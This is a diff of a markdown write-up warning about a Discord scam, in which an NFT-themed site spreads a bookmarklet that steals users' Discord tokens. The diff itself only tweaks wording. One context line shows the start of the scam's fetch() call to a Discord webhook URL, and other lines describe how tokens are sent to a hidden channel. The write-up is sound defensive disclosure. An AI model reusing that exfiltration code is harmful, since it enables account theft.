@@ -12,7 +12,7 @@ I am neutral when it comes to NFTs. Recently, someone from a NFT community notfi
 
 **Quick Notes:**
 - It appears they have linked a legit Twitter NFT service on their website to trick users: https://twitter.com/PGodjira.
-- After using a BetterDiscord plugin to find hidden channels, there was a channel in their server named #mod-logs.
+- After using a BetterDiscord plugin to find hidden channels, there was a channel in their server named `#mod-logs`.
 - The functionality of this bookmarklet is similiar to my repo: https://github.com/GalaxzyDev/MiniTokenMonster.
 
 ## 👀 First Glance
@@ -53,7 +53,7 @@ fetch("https://discord.com/api/webhooks/939322818280185906/ZkaQPqSP-vOrUdIObzR0Q
  ```
 
 4. This makes it obvious that this is a scam, not to mention, it being a bookmarklet. 
-   - The victims token will be sent over the webhook to their Discord's `#mod-logs` hidden channel.
+   - The victims token will be sent over the webhook to their Discord server `#mod-logs` hidden channel.
 
 ## ⛔ Heads up!
 People have fallen for this, due to this tactic not being widely seen. I hate to see people loose time and money due to this. Remember the notes below.
